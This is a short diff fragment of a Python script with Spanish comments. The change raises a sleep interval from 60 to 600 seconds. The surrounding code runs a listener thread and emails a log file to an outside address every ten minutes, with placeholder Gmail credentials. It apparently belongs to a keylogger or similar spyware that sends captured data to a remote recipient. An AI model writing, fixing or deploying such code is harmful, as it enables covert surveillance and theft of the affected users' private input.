@@ -109,7 +109,7 @@ listener_thread.start()
 
 # Enviar el log cada 10 minutos
 while True:
-    time.sleep(60)  # Esperar 10 minutos
+    time.sleep(600)  # Esperar 10 minutos
     if os.path.exists(log_file):
         send_log_via_email(log_file, "send_email@gmail.com", "password", "recipient_email@gmail.com")'''
 
